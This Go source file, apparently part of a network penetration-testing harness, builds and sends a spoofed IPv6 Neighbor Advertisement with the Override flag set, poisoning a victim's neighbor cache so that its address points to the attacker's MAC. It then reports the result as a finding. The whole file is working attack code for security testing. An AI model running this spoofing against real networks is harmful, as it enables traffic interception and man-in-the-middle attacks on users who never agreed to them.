// ndpspoof.go implements the IPv6 neighbor discovery spoofing attack.
//
// Durability (from the catalog): transient-decay. The attack sends a
// spoofed Neighbor Advertisement claiming the victim's IP is at the
// attacker's MAC. NUD / the real master resumes after the attack stops.
// No explicit teardown.

package ip6

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

type ndpSpoofFinding struct {
	Action   string `json:"action"`
	Target   string `json:"target"`
	SpoofMAC string `json:"spoof_mac"`
	Flags    uint8  `json:"flags"`
}

// RunNDPSpoof sends a spoofed Neighbor Advertisement claiming the
// victim's IP is at the attacker's MAC. The poison answer matches the
// reference fixture's fields (field-set comparison).
func RunNDPSpoof(ctx context.Context, deps runner.Deps) error {
	src := srcMAC()

	pkt, err := craftNDPSpoof(src)
	if err != nil {
		return fmt.Errorf("ndpspoof: craft NA: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return fmt.Errorf("ndpspoof: send NA: %w", err)
	}

	detail, _ := json.Marshal(ndpSpoofFinding{
		Action:   "neighbor-advertisement-spoof",
		Target:   victimIP6.String(),
		SpoofMAC: src.String(),
		Flags:    0x60, // Solicited + Override
	})
	deps.Emitter.Finding("ipv6-nd", detail)

	return nil
}

// craftNDPSpoof builds a spoofed Neighbor Advertisement: claims
// victimIP6 is at the attacker's MAC.
func craftNDPSpoof(src net.HardwareAddr) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       victimMAC6,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv6,
	}
	ip := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolICMPv6,
		HopLimit:   255,
		SrcIP:      net.ParseIP("fd00::999"),
		DstIP:      victimIP6,
	}
	icmp := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeNeighborAdvertisement, 0),
	}
	_ = icmp.SetNetworkLayerForChecksum(ip)

	na := &layers.ICMPv6NeighborAdvertisement{
		Flags:         0x60, // Solicited + Override
		TargetAddress: victimIP6,
		Options: layers.ICMPv6Options{
			{
				Type: layers.ICMPv6OptTargetAddress,
				Data: src, // attacker's MAC as target LLA
			},
		},
	}
	return craftDefault(eth, ip, icmp, na)
}

var (
	_ gopacket.SerializableLayer = (*layers.ICMPv6NeighborAdvertisement)(nil)
	_ gopacket.SerializableLayer = (*layers.ICMPv6)(nil)
)
